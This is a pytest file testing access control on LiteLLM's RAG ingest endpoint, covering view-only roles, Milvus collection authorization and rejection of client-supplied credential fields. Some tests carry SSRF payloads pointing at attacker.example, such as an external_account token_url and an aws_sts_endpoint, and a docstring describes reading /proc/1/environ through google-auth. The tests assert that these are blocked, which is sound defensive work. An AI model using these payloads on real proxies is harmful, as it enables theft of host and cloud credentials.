"""
Tests for RAG proxy endpoints.

Covers:
- internal_user_viewer restriction: can only ingest to existing vector stores (must provide vector_store_id)
"""

import io
import os
import sys
from unittest.mock import AsyncMock, patch

import pytest
from fastapi import HTTPException
from fastapi.testclient import TestClient

sys.path.insert(
    0, os.path.abspath("../../../../..")
)  # Adds the parent directory to the system path

from litellm.proxy._types import LitellmUserRoles, UserAPIKeyAuth
from litellm.proxy.auth.user_api_key_auth import user_api_key_auth
from litellm.proxy.proxy_server import app


@pytest.fixture
def client_internal_user_viewer():
    """Test client with internal_user_viewer auth."""
    mock_auth = UserAPIKeyAuth(
        user_id="test_viewer_user",
        user_role=LitellmUserRoles.INTERNAL_USER_VIEW_ONLY.value,
    )
    original_overrides = app.dependency_overrides.copy()
    app.dependency_overrides[user_api_key_auth] = lambda: mock_auth
    try:
        yield TestClient(app)
    finally:
        app.dependency_overrides = original_overrides


@pytest.fixture
def client_internal_user():
    """Test client with internal_user auth (can create new vector stores)."""
    mock_auth = UserAPIKeyAuth(
        user_id="test_internal_user",
        user_role=LitellmUserRoles.INTERNAL_USER.value,
    )
    original_overrides = app.dependency_overrides.copy()
    app.dependency_overrides[user_api_key_auth] = lambda: mock_auth
    try:
        yield TestClient(app)
    finally:
        app.dependency_overrides = original_overrides


def test_internal_user_viewer_rag_ingest_without_vector_store_id_rejected(
    client_internal_user_viewer,
):
    """
    internal_user_viewer cannot create new vector stores - must provide vector_store_id.
    """
    # Form upload without vector_store_id (would create new store)
    response = client_internal_user_viewer.post(
        "/v1/rag/ingest",
        files={"file": ("sample.txt", io.BytesIO(b"test content"), "text/plain")},
        data={
            "request": '{"ingest_options":{"vector_store":{"custom_llm_provider":"openai"}}}'
        },
    )

    assert response.status_code == 403
    detail = response.json()
    assert "detail" in detail
    error_msg = (
        detail["detail"]["error"]
        if isinstance(detail["detail"], dict)
        else str(detail["detail"])
    )
    assert "internal_user_viewer" in error_msg
    assert "vector_store_id" in error_msg


def test_internal_user_viewer_rag_ingest_with_vector_store_id_passes_check(
    client_internal_user_viewer,
):
    """
    internal_user_viewer with a vector_store_id passes the role check.
    (Actual ingest may fail due to missing API keys, but we get past 403.)
    """
    with patch(
        "litellm.proxy.rag_endpoints.endpoints.litellm.aingest",
        new_callable=AsyncMock,
        return_value={"vector_store_id": "vs_existing", "file_id": "file_123"},
    ):
        response = client_internal_user_viewer.post(
            "/v1/rag/ingest",
            files={"file": ("sample.txt", io.BytesIO(b"test content"), "text/plain")},
            data={
                "request": '{"ingest_options":{"vector_store":{"custom_llm_provider":"openai","vector_store_id":"vs_699651f6b6688191b0a210c00a686d20"}}}'
            },
        )

    # Should not be 403 (role check passed)
    assert (
        response.status_code != 403
    ), f"internal_user_viewer with vector_store_id should pass role check. Response: {response.json()}"


def test_internal_user_viewer_provider_native_vector_store_id_allowed(
    client_internal_user_viewer,
):
    """
    Regression: a view-only caller may still ingest into a provider-native
    vector store id that is not in litellm's managed registry, as long as the
    provider does not auto-create the store. Only auto-creating providers
    (e.g. Milvus) require the id to resolve to a managed store, so an OpenAI id
    must not be rejected just for being unregistered.
    """
    with (
        patch(
            "litellm.proxy.rag_endpoints.endpoints.assert_user_can_access_vector_store_id",
            new=AsyncMock(return_value=None),
        ),
        patch(
            "litellm.proxy.rag_endpoints.endpoints.litellm.aingest",
            new_callable=AsyncMock,
            return_value={"vector_store_id": "vs_provider_native", "file_id": "f"},
        ),
    ):
        response = client_internal_user_viewer.post(
            "/v1/rag/ingest",
            files={"file": ("sample.txt", io.BytesIO(b"test content"), "text/plain")},
            data={
                "request": '{"ingest_options":{"vector_store":{"custom_llm_provider":"openai","vector_store_id":"vs_provider_native"}}}'
            },
        )

    assert response.status_code != 403, (
        "view-only ingest into an unregistered provider-native (non-auto-create) "
        f"vector store id must be allowed. Got: {response.status_code} {response.json()}"
    )


def test_internal_user_viewer_milvus_collection_name_auto_create_rejected(
    client_internal_user_viewer,
):
    """
    internal_user_viewer must not be able to auto-create a new Milvus collection.

    The Milvus normalization mirrors collection_name onto vector_store_id, but an
    unknown id resolves to no managed vector store, so the view-only caller is
    denied before Milvus auto_create_collection can fire.
    """
    with (
        patch(
            "litellm.proxy.rag_endpoints.endpoints.assert_user_can_access_vector_store_id",
            new=AsyncMock(return_value=None),
        ),
        patch(
            "litellm.proxy.rag_endpoints.endpoints.litellm.aingest",
            new_callable=AsyncMock,
            return_value={"vector_store_id": "brand_new_collection", "file_id": "f"},
        ) as mock_aingest,
    ):
        response = client_internal_user_viewer.post(
            "/v1/rag/ingest",
            json={
                "file_url": "https://example.com/doc.pdf",
                "ingest_options": {
                    "vector_store": {
                        "custom_llm_provider": "milvus",
                        "collection_name": "brand_new_collection",
                    }
                },
            },
        )

    assert response.status_code == 403, (
        "internal_user_viewer creating a new Milvus collection via collection_name "
        f"must be denied. Got: {response.status_code} {response.json()}"
    )
    mock_aingest.assert_not_called()


def test_internal_user_viewer_milvus_auto_create_disabled_still_requires_managed_store(
    client_internal_user_viewer,
):
    """
    Regression: auto_create_collection is request-controlled, so a view-only key
    must not be able to set it to false, name any existing unmanaged collection,
    and skip the managed-store check. Milvus can always auto-create, so the
    target must still resolve to a managed vector store regardless of the flag;
    an unmanaged collection (assert_user_can_access_vector_store_id returns None)
    is denied before aingest fires.
    """
    with (
        patch(
            "litellm.proxy.rag_endpoints.endpoints.assert_user_can_access_vector_store_id",
            new=AsyncMock(return_value=None),
        ),
        patch(
            "litellm.proxy.rag_endpoints.endpoints.litellm.aingest",
            new_callable=AsyncMock,
            return_value={"vector_store_id": "existing_collection", "file_id": "f"},
        ) as mock_aingest,
    ):
        response = client_internal_user_viewer.post(
            "/v1/rag/ingest",
            json={
                "file_url": "https://example.com/doc.pdf",
                "ingest_options": {
                    "vector_store": {
                        "custom_llm_provider": "milvus",
                        "collection_name": "existing_collection",
                        "auto_create_collection": False,
                    }
                },
            },
        )

    assert response.status_code == 403, (
        "view-only Milvus ingest with auto_create_collection disabled must still "
        "require the collection to resolve to a managed vector store. "
        f"Got: {response.status_code} {response.json()}"
    )
    mock_aingest.assert_not_called()


def test_internal_user_viewer_milvus_managed_collection_passes_with_auto_create_disabled(
    client_internal_user_viewer,
):
    """
    The capability-based managed-store requirement must not over-block: when the
    Milvus collection does resolve to a managed vector store the caller can
    access, a view-only ingest with auto_create_collection disabled passes.
    """
    with (
        patch(
            "litellm.proxy.rag_endpoints.endpoints.assert_user_can_access_vector_store_id",
            new=AsyncMock(return_value=object()),
        ),
        patch(
            "litellm.proxy.rag_endpoints.endpoints.litellm.aingest",
            new_callable=AsyncMock,
            return_value={"vector_store_id": "managed_collection", "file_id": "f"},
        ),
    ):
        response = client_internal_user_viewer.post(
            "/v1/rag/ingest",
            json={
                "file_url": "https://example.com/doc.pdf",
                "ingest_options": {
                    "vector_store": {
                        "custom_llm_provider": "milvus",
                        "collection_name": "managed_collection",
                        "auto_create_collection": False,
                    }
                },
            },
        )

    assert response.status_code != 403, (
        "view-only Milvus ingest into a managed collection must pass the role "
        f"check. Got: {response.status_code} {response.json()}"
    )


def test_internal_user_rag_ingest_without_vector_store_id_allowed(client_internal_user):
    """
    internal_user can create new vector stores (no vector_store_id required).
    """
    with patch(
        "litellm.proxy.rag_endpoints.endpoints.litellm.aingest",
        new_callable=AsyncMock,
        return_value={"vector_store_id": "vs_new", "file_id": "file_123"},
    ):
        response = client_internal_user.post(
            "/v1/rag/ingest",
            files={"file": ("sample.txt", io.BytesIO(b"test content"), "text/plain")},
            data={
                "request": '{"ingest_options":{"vector_store":{"custom_llm_provider":"openai"}}}'
            },
        )

    # Should not be 403
    assert (
        response.status_code != 403
    ), f"internal_user should be allowed to create new vector stores. Response: {response.json()}"


@pytest.mark.parametrize(
    "blocked_field",
    [
        "vertex_credentials",
        "vertex_ai_credentials",
        "aws_access_key_id",
        "aws_secret_access_key",
        "aws_session_token",
        "api_key",
        "api_base",
    ],
)
def test_rag_ingest_blocks_clientside_credentials(client_internal_user, blocked_field):
    """
    Credential fields in ingest_options.vector_store must be rejected.

    Accepting user-supplied credentials (e.g. vertex_credentials with
    type=external_account + credential_source.file=/proc/1/environ) allows
    any authenticated user to exfiltrate host secrets via SSRF through
    google-auth's identity_pool credential refresh.
    """
    payload = {
        "ingest_options": {
            "vector_store": {
                "custom_llm_provider": "vertex_ai",
                "vertex_project": "x",
                blocked_field: {
                    "type": "external_account",
                    "token_url": "http://attacker.example/sts",
                },
            }
        }
    }
    response = client_internal_user.post(
        "/v1/rag/ingest",
        json={
            **payload,
            "file": {
                "filename": "q.txt",
                "content": "dGVzdA==",
                "content_type": "text/plain",
            },
        },
    )
    assert (
        response.status_code == 400
    ), f"Expected 400 when '{blocked_field}' is set clientside, got {response.status_code}: {response.json()}"
    body = response.json()
    assert blocked_field in str(
        body
    ), f"Response should mention '{blocked_field}': {body}"


class TestRagIngestSSRFBlocked:
    """
    aws_sts_endpoint and related credential-redirect fields must be rejected
    in ingest_options.vector_store. Without this guard, any authenticated
    client can coerce the proxy to make a signed STS AssumeRole call to an
    attacker-controlled server, leaking the instance profile credentials.
    """

    @pytest.mark.parametrize(
        "field,value",
        [
            ("aws_sts_endpoint", "https://attacker.example/sts"),
            ("aws_web_identity_token", "fake-token"),
            ("aws_bedrock_runtime_endpoint", "https://attacker.example/bedrock"),
        ],
    )
    def test_ssrf_field_in_vector_store_config_rejected(
        self, field, value, client_internal_user
    ):
        payload = {
            "file_url": "https://example.com/doc.pdf",
            "ingest_options": {
                "vector_store": {
                    "custom_llm_provider": "bedrock",
                    field: value,
                }
            },
        }
        response = client_internal_user.post(
            "/v1/rag/ingest",
            json=payload,
        )
        assert response.status_code == 400, (
            f"{field} in ingest_options.vector_store should be rejected (400), "
            f"got {response.status_code}: {response.json()}"
        )
        body = response.json()
        detail = body.get("detail", {})
        error_text = (
            detail.get("error", "") if isinstance(detail, dict) else str(detail)
        )
        assert (
            field in error_text
        ), f"Error should name the offending field: {error_text}"

    def test_clean_bedrock_ingest_options_not_rejected(self, client_internal_user):
        with patch(
            "litellm.proxy.rag_endpoints.endpoints.litellm.aingest",
            new_callable=AsyncMock,
            return_value={"vector_store_id": "vs_bedrock", "file_id": "file_123"},
        ):
            response = client_internal_user.post(
                "/v1/rag/ingest",
                json={
                    "file_url": "https://example.com/doc.pdf",
                    "ingest_options": {
                        "vector_store": {"custom_llm_provider": "bedrock"}
                    },
                },
            )
        assert (
            response.status_code != 400
        ), f"Clean Bedrock ingest_options should not be rejected: {response.json()}"


class TestMilvusCollectionNameAuthorization:
    """
    Milvus ingestion writes to `collection_name` (falling back to
    `vector_store_id`). The proxy authorizes write targets by the
    `vector_store_id` key, so a request that sets only `collection_name` must be
    normalized so it is authorized as the vector store id - otherwise an
    authenticated user could write into another team's managed collection with
    the server's Milvus credentials.
    """

    def test_normalize_copies_collection_name_to_vector_store_id(self):
        from litellm.proxy.rag_endpoints.endpoints import (
            _normalize_collection_name_as_vector_store_id,
        )

        ingest_options = {
            "vector_store": {
                "custom_llm_provider": "milvus",
                "collection_name": "other_team_collection",
            }
        }
        _normalize_collection_name_as_vector_store_id(ingest_options)
        assert (
            ingest_options["vector_store"]["vector_store_id"] == "other_team_collection"
        )

    def test_normalize_overrides_vector_store_id_with_collection_name(self):
        """
        Sending both fields must not let a caller authorize against a
        `vector_store_id` they can access while writing to a different
        `collection_name`. The collection_name (the real write target) always
        wins so authorization covers it.
        """
        from litellm.proxy.rag_endpoints.endpoints import (
            _normalize_collection_name_as_vector_store_id,
        )

        ingest_options = {
            "vector_store": {
                "custom_llm_provider": "milvus",
                "collection_name": "other_team_collection",
                "vector_store_id": "vs_caller_can_access",
            }
        }
        _normalize_collection_name_as_vector_store_id(ingest_options)
        assert (
            ingest_options["vector_store"]["vector_store_id"] == "other_team_collection"
        )

    def test_normalize_ignores_non_milvus_providers(self):
        from litellm.proxy.rag_endpoints.endpoints import (
            _normalize_collection_name_as_vector_store_id,
        )

        ingest_options = {
            "vector_store": {
                "custom_llm_provider": "openai",
                "collection_name": "col_a",
            }
        }
        _normalize_collection_name_as_vector_store_id(ingest_options)
        assert "vector_store_id" not in ingest_options["vector_store"]

    def test_milvus_collection_name_is_authorized(self, client_internal_user):
        async def fake_assert(vector_store_id, user_api_key_dict, **kwargs):
            if vector_store_id == "other_team_collection":
                raise HTTPException(
                    status_code=403,
                    detail={"error": "Access denied"},
                )
            return None

        with (
            patch(
                "litellm.proxy.rag_endpoints.endpoints.assert_user_can_access_vector_store_id",
                new=AsyncMock(side_effect=fake_assert),
            ),
            patch(
                "litellm.proxy.rag_endpoints.endpoints.litellm.aingest",
                new_callable=AsyncMock,
                return_value={
                    "vector_store_id": "other_team_collection",
                    "file_id": "f",
                },
            ),
        ):
            response = client_internal_user.post(
                "/v1/rag/ingest",
                json={
                    "file_url": "https://example.com/doc.pdf",
                    "ingest_options": {
                        "vector_store": {
                            "custom_llm_provider": "milvus",
                            "collection_name": "other_team_collection",
                        }
                    },
                },
            )
        assert response.status_code == 403, (
            "Milvus ingest targeting another team's collection via collection_name "
            f"must be authorized and denied. Got: {response.status_code} {response.json()}"
        )

    def test_milvus_collection_name_bypass_with_both_fields_is_denied(
        self, client_internal_user
    ):
        async def fake_assert(vector_store_id, user_api_key_dict, **kwargs):
            if vector_store_id == "other_team_collection":
                raise HTTPException(
                    status_code=403,
                    detail={"error": "Access denied"},
                )
            return None

        with (
            patch(
                "litellm.proxy.rag_endpoints.endpoints.assert_user_can_access_vector_store_id",
                new=AsyncMock(side_effect=fake_assert),
            ),
            patch(
                "litellm.proxy.rag_endpoints.endpoints.litellm.aingest",
                new_callable=AsyncMock,
                return_value={
                    "vector_store_id": "other_team_collection",
                    "file_id": "f",
                },
            ),
        ):
            response = client_internal_user.post(
                "/v1/rag/ingest",
                json={
                    "file_url": "https://example.com/doc.pdf",
                    "ingest_options": {
                        "vector_store": {
                            "custom_llm_provider": "milvus",
                            "collection_name": "other_team_collection",
                            "vector_store_id": "vs_caller_can_access",
                        }
                    },
                },
            )
        assert response.status_code == 403, (
            "Pairing an authorized vector_store_id with an unauthorized "
            "collection_name must still be denied. Got: "
            f"{response.status_code} {response.json()}"
        )


class TestIngestionAutoCreateDetection:
    """
    The view-only guard only requires managed-store resolution for ingestions
    that can create a store on write. That decision is owned per-provider via
    `can_auto_create_vector_store` and dispatched by
    `_ingestion_can_auto_create_vector_store`.
    """

    def test_milvus_auto_creates_by_default(self):
        from litellm.proxy.rag_endpoints.endpoints import (
            _ingestion_can_auto_create_vector_store,
        )

        assert (
            _ingestion_can_auto_create_vector_store(
                {"custom_llm_provider": "milvus", "collection_name": "c"}
            )
            is True
        )

    def test_milvus_auto_create_flag_is_not_request_trusted(self):
        from litellm.proxy.rag_endpoints.endpoints import (
            _ingestion_can_auto_create_vector_store,
        )

        assert (
            _ingestion_can_auto_create_vector_store(
                {
                    "custom_llm_provider": "milvus",
                    "collection_name": "c",
                    "auto_create_collection": False,
                }
            )
            is True
        )

    def test_openai_never_auto_creates(self):
        from litellm.proxy.rag_endpoints.endpoints import (
            _ingestion_can_auto_create_vector_store,
        )

        assert (
            _ingestion_can_auto_create_vector_store(
                {"custom_llm_provider": "openai", "vector_store_id": "vs_x"}
            )
            is False
        )

    def test_unknown_provider_is_not_auto_create(self):
        from litellm.proxy.rag_endpoints.endpoints import (
            _ingestion_can_auto_create_vector_store,
        )

        assert (
            _ingestion_can_auto_create_vector_store(
                {"custom_llm_provider": "not_a_real_provider"}
            )
            is False
        )
